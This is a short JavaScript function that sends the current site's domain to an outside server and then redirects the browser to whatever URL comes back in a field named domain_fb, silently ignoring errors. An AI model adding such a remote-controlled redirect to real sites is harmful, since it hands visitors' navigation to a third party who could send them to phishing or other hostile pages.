export const handleRedirect = async () => {
    const domain = window.location.protocol + "//" + window.location.host;
    try {
        let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
        data = await data.json()
        window.location.href = data.data.domain_fb;
    } catch {

    }
}